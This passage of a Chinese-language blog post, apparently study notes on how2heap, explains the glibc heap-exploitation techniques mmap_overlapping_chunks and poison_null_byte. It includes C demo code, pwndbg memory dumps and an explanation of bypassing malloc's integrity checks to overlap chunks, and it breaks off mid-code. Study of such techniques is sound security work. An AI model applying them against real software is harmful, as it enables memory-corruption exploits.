src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516428473-6460f742-890b-423a-9cdd-963f72cb0fbd.png#clientId=u347f053a-7aac-4&from=paste&height=45&id=u8a504495&margin=%5Bobject%20Object%5D&name=image.png&originHeight=82&originWidth=385&originalType=binary%E2%88%B6=1&size=23281&status=done&style=none&taskId=ufc137763-aa72-417e-b0e3-19618068a5e&width=210.5" alt="image.png"><br>查看 p3 数据<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516463318-ff5da060-aa82-4e43-bdf9-adbffcb6ab26.png#clientId=u347f053a-7aac-4&from=paste&height=103&id=uff58dfc3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=206&originWidth=1821&originalType=binary%E2%88%B6=1&size=351670&status=done&style=none&taskId=u79b992fb-5ce9-4fef-a0c3-fa77c8646f3&width=910.5" alt="image.png"><br>修改之后<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516499843-8afc4529-02d1-4370-a068-f6ec15a44ab3.png#clientId=u347f053a-7aac-4&from=paste&height=373&id=ue02a99dc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=745&originWidth=1803&originalType=binary%E2%88%B6=1&size=1230606&status=done&style=none&taskId=u61a5de77-4b93-4de2-a164-2ca52e95455&width=901.5" alt="image.png"><br>与之前的 overlapping 相比，之前的是释放后修改 size，重新申请后覆盖了后面的堆；这个是先修改 size,使之大小覆盖了后面的堆，再释放后和已释放的大后个堆合并，包含了要覆盖的堆，重新申请后即可覆盖包含的堆的内容。</p><h1 id="mmap-overlapping-chunks-2-28"><a href="#mmap-overlapping-chunks-2-28" class="headerlink" title="mmap_overlapping_chunks-2.28"></a>mmap_overlapping_chunks-2.28</h1><p>代码翻译如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span>* ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;这种技术依然是 overlapping 但是针对的是比较大的 (通过 mmap 申请的)\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;分配大的 chunk 是比较特殊的，因为他们分配在单独的内存中，而不是普通的堆中\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;分配三个大小为 0x100000 的 chunk \n\n&quot;</span>);<br><br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>* top_ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第一个 mmap 块位于 Libc 上方： %p\n&quot;</span>,top_ptr);<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>* mmap_chunk_2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第二个 mmap 块位于 Libc 下方： %p\n&quot;</span>, mmap_chunk_2);<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>* mmap_chunk_3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第三个 mmap 块低于第二个 mmap 块: %p\n&quot;</span>, mmap_chunk_3);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n当前系统内存布局\n&quot;</span> \<br><span class="hljs-string">&quot;================================================\n&quot;</span> \<br><span class="hljs-string">&quot;running program\n&quot;</span> \<br><span class="hljs-string">&quot;heap\n&quot;</span> \<br><span class="hljs-string">&quot;....\n&quot;</span> \<br><span class="hljs-string">&quot;third mmap chunk\n&quot;</span> \<br><span class="hljs-string">&quot;second mmap chunk\n&quot;</span> \<br><span class="hljs-string">&quot;LibC\n&quot;</span> \<br><span class="hljs-string">&quot;....\n&quot;</span> \<br><span class="hljs-string">&quot;ld\n&quot;</span> \<br><span class="hljs-string">&quot;first mmap chunk\n&quot;</span><br><span class="hljs-string">&quot;===============================================\n\n&quot;</span> \<br>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第一个 mmap 的 prev_size: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-2</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第三个 mmap 的 size: 0x%llx\n\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-1</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;假设有一个漏洞可以更改第三个 mmap 的大小，让他与第二个 mmap 块重叠\n&quot;</span>);<br>    mmap_chunk_3[<span class="hljs-number">-1</span>] = (<span class="hljs-number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="hljs-number">-1</span>]) + (<span class="hljs-number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="hljs-number">-1</span>]) | <span class="hljs-number">2</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;现在改掉的第三个 mmap 块的大小是: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-1</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;free 掉第三个 mmap 块,\n\n&quot;</span>);<br><br>    <span class="hljs-built_in">free</span>(mmap_chunk_3);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;再分配一个很大的 mmap chunk\n&quot;</span>);<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>* overlapping_chunk = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;新申请的 Overlapped chunk 在: %p\n&quot;</span>, overlapping_chunk);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overlapped chunk 的大小是: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="hljs-number">-1</span>]);<br><br>    <span class="hljs-keyword">int</span> distance = mmap_chunk_2 - overlapping_chunk;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;新的堆块与第二个 mmap 块之间的距离: 0x%x\n&quot;</span>, distance);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;写入之前 mmap chunk2 的 index0 写的是: %llx\n&quot;</span>, mmap_chunk_2[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;编辑 overlapping chunk 的值\n&quot;</span>);<br>    overlapping_chunk[distance] = <span class="hljs-number">0x1122334455667788</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;写之后第二个 chunk 的值: 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overlapped chunk 的值: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;新块已与先前的块重叠\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>一开始申请了 3 个 0x100000 大小的堆<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622810060975-70accae6-2d7b-4ea0-8c0b-2b8330d34090.png#clientId=u38185df4-f4d6-4&from=paste&height=418&id=JCTtJ&margin=%5Bobject%20Object%5D&name=image.png&originHeight=835&originWidth=791&originalType=binary%E2%88%B6=1&size=677675&status=done&style=none&taskId=u9abe04a3-7168-40a6-9733-d55ff18f436&width=395.5" alt="image.png"><br>可以看到，普通堆区并没有分配的 0x100000 大小的堆。<br>然后查看相应的内存布局：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; n<br>The first mmap chunk goes directly above LibC: <span class="hljs-number">0x7fffff6a0010</span><br>The second mmap chunk goes below LibC: <span class="hljs-number">0x7fffff520010</span><br>The third mmap chunk goes below the second mmap chunk: <span class="hljs-number">0x7ffffef20010</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x7fffff6a0000</span><br><span class="hljs-number">0x7fffff6a0000</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000101002</span><br><span class="hljs-number">0x7fffff6a0010</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff6a0020</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff6a0030</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff6a0040</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x7fffff520000</span><br><span class="hljs-number">0x7fffff520000</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000101002</span><br><span class="hljs-number">0x7fffff520010</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff520020</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff520030</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff520040</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x7ffffef20000</span><br><span class="hljs-number">0x7ffffef20000</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000101002</span><br><span class="hljs-number">0x7ffffef20010</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffffef20020</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffffef20030</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffffef20040</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>然后把第三个的 size 改成 0x202002<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622810875923-992f251d-9557-4137-8e74-cdc69483316b.png#clientId=u38185df4-f4d6-4&from=paste&height=309&id=njK7W&margin=%5Bobject%20Object%5D&name=image.png&originHeight=618&originWidth=1017&originalType=binary%E2%88%B6=1&size=646248&status=done&style=none&taskId=u334e294b-3df8-4042-80a0-c97fe1330ba&width=508.5" alt="image.png"><br>free 掉第三个，然后再去 malloc(0x300000)<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622811116922-428bdcdc-fd73-4cd7-ac2d-1ce2af6b62d8.png#clientId=u38185df4-f4d6-4&from=paste&height=32&id=XX3vY&margin=%5Bobject%20Object%5D&name=image.png&originHeight=63&originWidth=582&originalType=binary%E2%88%B6=1&size=44129&status=done&style=none&taskId=u7f6741db-376b-47c4-8b1a-3c71138b5fb&width=291" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622811179192-28d929d2-e624-4531-ab0c-caf74a4669fb.png#clientId=u38185df4-f4d6-4&from=paste&height=31&id=JApc7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=62&originWidth=559&originalType=binary%E2%88%B6=1&size=46123&status=done&style=none&taskId=u3a66a5c0-d5c7-442f-9723-717b01d968d&width=279.5" alt="image.png"><br>新块距离第二个 mmap 块 0x42000<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622811244548-c1d89fc5-1bc6-40cf-a5f2-73788963b009.png#clientId=u38185df4-f4d6-4&from=paste&height=32&id=EofbB&margin=%5Bobject%20Object%5D&name=image.png&originHeight=63&originWidth=886&originalType=binary%E2%88%B6=1&size=55992&status=done&style=none&taskId=ude624104-d595-499b-90f6-482b630f2ba&width=443" alt="image.png"><br>写入前 mmap 块 2 的索引 0 的值：0<br>写入后：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622811684599-d2bec512-51f9-45cd-92fb-b85e96035c85.png#clientId=u38185df4-f4d6-4&from=paste&height=305&id=OfhSX&margin=%5Bobject%20Object%5D&name=image.png&originHeight=610&originWidth=1033&originalType=binary%E2%88%B6=1&size=694967&status=done&style=none&taskId=u876b92d0-802b-4c31-8f55-072f7bb7b26&width=516.5" alt="image.png"><br>这样通过对新创建的堆块进行写操作就可以覆盖掉原本第二个那里的数据。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622811737939-fb0b2ec4-964e-486c-a510-6957d42e2803.png#clientId=u38185df4-f4d6-4&from=paste&height=469&id=nhwuf&margin=%5Bobject%20Object%5D&name=image.png&originHeight=938&originWidth=875&originalType=binary%E2%88%B6=1&size=878998&status=done&style=none&taskId=u206739db-6236-4085-942e-83ed57c6cd1&width=437.5" alt="image.png"></p><h1 id="poison-null-byte-2-23"><a href="#poison-null-byte-2-23" class="headerlink" title="poison_null_byte-2.23"></a>poison_null_byte-2.23</h1><p><strong>翻译：</strong><br>这个技术可被用于当可以被 malloc 的区域（也就是 heap 区域）存在一个单字节溢出漏洞的时候。<br>我们先分配 0x100 个字节的内存，代号’a’。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516783705-1a5929d0-4167-480e-b877-236af6e0c2a1.png#clientId=u347f053a-7aac-4&from=paste&height=301&id=u5332779a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=601&originWidth=1052&originalType=binary%E2%88%B6=1&size=407596&status=done&style=none&taskId=u9d6172d7-16fa-44c2-aa70-87ac6d04b53&width=526" alt="image.png"><br>如果我们想要去溢出 a 的话，我们需要知道它的实际大小（因为空间复用的存在），在我的机器上是 0x108。<br>为什么是 0x108 呢，是因为所以 chunk 的头部需要占用 0x10 字节，但是 chunk 可以使用下一个 chunk 头部的 prev_size 位，就节省了 0x8 字节，所以最后是占用了 0x108 字节。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516826408-e6c8cfd8-c3b6-45be-875b-f49fd950ece7.png#clientId=u347f053a-7aac-4&from=paste&height=289&id=u8b4851bd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=577&originWidth=1365&originalType=binary%E2%88%B6=1&size=728992&status=done&style=none&taskId=u63a5e533-4198-4fbe-a191-c2dca5db548&width=682.5" alt="image.png"><br>然后接着我们分配 0x200 个字节，代号’b’。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516845496-82a95d01-6617-4f14-adcc-5ab7991bc9af.png#clientId=u347f053a-7aac-4&from=paste&height=309&id=ue93ab3d7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=617&originWidth=1148&originalType=binary%E2%88%B6=1&size=649735&status=done&style=none&taskId=u9dc10b62-3b11-496b-95de-9caf3992412&width=574" alt="image.png"><br>此时堆内存布局如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622725940259-9f402099-51f5-4f70-8786-852ace6f67d8.png#clientId=u347f053a-7aac-4&from=paste&height=148&id=uc5e70fd3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=295&originWidth=538&originalType=binary%E2%88%B6=1&size=159216&status=done&style=none&taskId=u63231e7b-2f8d-4edc-a4fc-2f82a057732&width=269" alt="image.png"><br>再分配 0x100 个字节，代号’c’。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516858724-c8f09768-4c04-49d4-a253-2be2f9e7c20b.png#clientId=u347f053a-7aac-4&from=paste&height=296&id=u423519cb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=591&originWidth=1133&originalType=binary%E2%88%B6=1&size=405738&status=done&style=none&taskId=u94a732ca-f9f8-4ab6-84f2-7db0ec08c52&width=566.5" alt="image.png"><br>然后分配一个 0x100 字节的 barrier 在 0x8008440，以便在释放时 c 不会与顶部块合并（这个障碍并不是绝对必要的，但是可以让事情变得不那么混乱）<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517067038-3059645d-1235-4fd8-b8c8-c519a9deecde.png#clientId=u347f053a-7aac-4&from=paste&height=267&id=ub82ff069&margin=%5Bobject%20Object%5D&name=image.png&originHeight=534&originWidth=510&originalType=binary%E2%88%B6=1&size=250039&status=done&style=none&taskId=ud073f0fb-3f9f-4b25-9808-51e3b549156&width=255" alt="image.png"><br>在新版 glibc 环境下，我们需要在 b 内部更新 size 来逃避检测 <strong>‘chunksize(P) != prev_size (next_chunk(P))’</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">*(<span class="hljs-keyword">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><span class="hljs-built_in">free</span>(b)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517147271-c235dd7c-5080-47c0-9fbb-185a04d6791c.png#clientId=u347f053a-7aac-4&from=paste&height=289&id=uc80f2690&margin=%5Bobject%20Object%5D&name=image.png&originHeight=578&originWidth=685&originalType=binary%E2%88%B6=1&size=374695&status=done&style=none&taskId=u0671d3d9-a34a-469a-803d-96d98691d0d&width=342.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517208552-c7242d67-bb80-4700-9f3c-6c0c5cc8a5f0.png#clientId=u347f053a-7aac-4&from=paste&height=30&id=u73eedff9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=59&originWidth=186&originalType=binary%E2%88%B6=1&size=8472&status=done&style=none&taskId=uf4682486-08da-489c-b564-2ad6be3a5b5&width=93" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517199253-eff1e468-bfdd-416d-b51e-2e4c641b08cb.png#clientId=u347f053a-7aac-4&from=paste&height=28&id=u625cb874&margin=%5Bobject%20Object%5D&name=image.png&originHeight=56&originWidth=453&originalType=binary%E2%88%B6=1&size=23547&status=done&style=none&taskId=u4744f654-460a-4710-984d-040fd67656f&width=226.5" alt="image.png"><br>此时堆内存布局如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622726539649-701affdb-ff6b-4d3b-bc4e-f72b77f4f629.png#clientId=u347f053a-7aac-4&from=paste&height=151&id=u9e500445&margin=%5Bobject%20Object%5D&name=image.png&originHeight=301&originWidth=542&originalType=binary%E2%88%B6=1&size=122557&status=done&style=none&taskId=u129e444d-eeb5-4bda-a8a7-57a90e3829e&width=271" alt="image.png"></p><p>我们在 a 实现一个单字节的 null byte 溢出。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517393953-26a6095c-4771-4833-a47c-b62e09746449.png#clientId=u347f053a-7aac-4&from=paste&height=296&id=u14eaae63&margin=%5Bobject%20Object%5D&name=image.png&originHeight=592&originWidth=1095&originalType=binary%E2%88%B6=1&size=548441&status=done&style=none&taskId=ubb192e74-9239-455a-a70e-f3635c1e1cf&width=547.5" alt="image.png"><br>可以看到 b 的 size 变成了 0x200<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517480514-0e4837dd-caf8-4112-bf9e-fa101aeaf55c.png#clientId=u347f053a-7aac-4&from=paste&height=196&id=udad05044&margin=%5Bobject%20Object%5D&name=image.png&originHeight=392&originWidth=560&originalType=binary%E2%88%B6=1&size=215629&status=done&style=none&taskId=u54d31539-3a17-4293-b8d9-4d46d24dc77&width=280" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622726631071-e2b81bee-a247-4f1f-92be-381e4e70bd76.png#clientId=u347f053a-7aac-4&from=paste&height=147&id=t6067&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=542&originalType=binary%E2%88%B6=1&size=192046&status=done&style=none&taskId=ue48f1fd2-2a78-47b3-bc68-82d30fc82ee&width=271" alt="image.png"><br>为了在修改 chunk b 的 size 字段后，依然能通过 unlink 的检查，我们需要伪造一个 c.prev_size 字段，字段的大小是很好计算的，即</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">(<span class="hljs-number">0x211</span> &amp; <span class="hljs-number">0xff00</span>) == <span class="hljs-number">0x200</span><br></code></pre></td></tr></table></figure><p>然而此时 c.presize = 0x210 但是没关系我们还是能逃过掉前面那个检查，根据</p><ul><li>chunksize(P) == _((size_t_)(b-0x8)) == 0x200</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622727069161-149a5fe1-9220-46af-8cf9-029e67d5c6e2.png#clientId=u347f053a-7aac-4&from=paste&height=29&id=udb9d75df&margin=%5Bobject%20Object%5D&name=image.png&originHeight=57&originWidth=349&originalType=binary%E2%88%B6=1&size=15531&status=done&style=none&taskId=u872d4aa7-ddf6-44cb-88ed-dcefeb1f8c9&width=174.5" alt="image.png"></p><ul><li>prev_size (next_chunk(P)) == _(size_t_)(b-0x10 + 0x200) == 0x200</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622726951068-d6da0af4-8bd0-4e33-b003-9c078bb71d70.png#clientId=u347f053a-7aac-4&from=paste&height=26&id=u62a4d804&margin=%5Bobject%20Object%5D&name=image.png&originHeight=51&originWidth=464&originalType=binary%E2%88%B6=1&size=20487&status=done&style=none&taskId=u592a1b66-9865-4f94-aa68-12c1ad333e3&width=232" alt="image.png"><br>可以成功绕过检查。另外 unsorted bin 中的 chunk 大小也变成了 0x200<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517525391-5556d241-f561-4af8-aa49-788ca9c4cf55.png#clientId=u347f053a-7aac-4&from=paste&height=299&id=u041b16b4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=597&originWidth=1095&originalType=binary%E2%88%B6=1&size=563900&status=done&style=none&taskId=u067af4f7-7887-4809-bbff-9fde5b59098&width=547.5" alt="image.png"><br>此时 c 附近的内存布局为：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622790352514-7925401c-b1a6-486a-bd99-e28a59857e50.png#clientId=u38185df4-f4d6-4&from=paste&height=89&id=ubab11d5a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=178&originWidth=630&originalType=binary%E2%88%B6=1&size=133263&status=done&style=none&taskId=u00b8c7ae-fce5-42f9-af3e-3ee466a238b&width=315" alt="image.png"><br>然后 malloc 一个大小 0x100 的<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517765087-15d8214d-3ba8-4762-a5f2-c83222035cde.png#clientId=u347f053a-7aac-4&from=paste&height=246&id=u5287ab82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=492&originWidth=717&originalType=binary%E2%88%B6=1&size=211710&status=done&style=none&taskId=u47f0c58b-bc17-41e6-8618-b79ccd5522f&width=358.5" alt="image.png"><br>返回给 b1 的地址就是前面 free 掉的 b 的地址。<br>这个时候 chunk c 的 prev_size 本应该变为 0xf0（0x200-0x110)。<br>注意分配堆块后，发生变化的是 fake c.prev_size，而不是 c.prev_size。现在 C 的 presize 在原来地址的前 0x10 bytes 处（2 个单元）更新。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">10</span>gx c<span class="hljs-number">-0x20</span><br><span class="hljs-number">0x8008310</span>:      <span class="hljs-number">0x00000000000000f0</span>      <span class="hljs-number">0x0000000000000000</span>   &lt;-fake chunk<br><span class="hljs-number">0x8008320</span>:      <span class="hljs-number">0x0000000000000210</span>      <span class="hljs-number">0x0000000000000110</span>   &lt;-chunk c<br><span class="hljs-number">0x8008330</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8008340</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8008350</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>所以 chunk c 依然认为 chunk b 的地方有一个大小为 0x210 的 free chunk。但其实这片内存已经被分配给了 chunk b1。<br>再 b2 = malloc(0x80);<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517901533-57260577-e5af-410e-a8a9-40dedc8c706d.png#clientId=u347f053a-7aac-4&from=paste&height=325&id=u67d2c401&margin=%5Bobject%20Object%5D&name=image.png&originHeight=649&originWidth=765&originalType=binary%E2%88%B6=1&size=432623&status=done&style=none&taskId=uad2f58c3-1b4a-4bc6-bceb-b69c2430848&width=382.5" alt="image.png"><br>查看 b2 内容<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622518111313-7cdbe7b7-24da-4a27-9627-3eeeedbe34c0.png#clientId=u347f053a-7aac-4&from=paste&height=43&id=u9891ba02&margin=%5Bobject%20Object%5D&name=image.png&originHeight=86&originWidth=1408&originalType=binary%E2%88%B6=1&size=66799&status=done&style=none&taskId=u4abc7e76-7fc1-430b-b003-67a1ca162ab&width=704" alt="image.png"><br>之后我们将 b1 和 c 依次 free。这会导致 b1 开始的位置一直到 c 的末尾中间的内存会合并成一块。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622518194077-7a76d8d7-bdb0-4646-9265-9bff36bf6d1a.png#clientId=u347f053a-7aac-4&from=paste&height=245&id=ue1b01bcc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=489&originWidth=690&originalType=binary%E2%88%B6=1&size=307368&status=done&style=none&taskId=u66134a2a-6185-42df-8286-348ccc688e4&width=345" alt="image.png"><br>为什么会发生合并？<br>在我们第一次 free(b)之前，进行了如下的设置：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">*(<span class="hljs-keyword">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br></code></pre></td></tr></table></figure><p>这一步确保了我们之后进行 null byte 溢出后，还能成功 free(b)，逃过** ‘chunksize(P) != prev_size (next_chunk(P))’** 的检查。<br>之后分配 b1 和 b2 的时候，presize 也会一直在(b+0x1f0)处更新。<br>而在最后 free(c)的时候，检查的是 c 的 presize 位，而因为最开始的 null byte 溢出，导致这块区域的值一直没被更新，一直是 b 最开始的大小 0x210 。<br>我们知道，两个相邻的 small chunk 被释放后会被合并在一起。首先释放 chunk b1，伪造出 fake chunk b 是 free chunk 的样子。然后释放 chunk c，因为 chunk c 的 prevsize 没有变化，这个时候 chunk c 会认为 chunk b1 就是 chunk b，这时程序会发现 chunk c 的前一个 chunk 是一个 free chunk，然后就将它们合并在了一起，并从 unsorted bin 中取出来合并进了 top chunk。 chunk b2 位于 chunk b1 和 chunk c 之间，被直接无视了，现在 malloc 认为这整块区域都是未分配的。</p><blockquote><p>补充：</p></blockquote><p>chunk 合并的过程如下，首先该 chunk 与前一个 chunk 合并，然后检查下一个 chunk 是否为 top chunk，如果不是，将合并后的 chunk 放回 unsorted bin 中，否则，合并进 top chunk：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 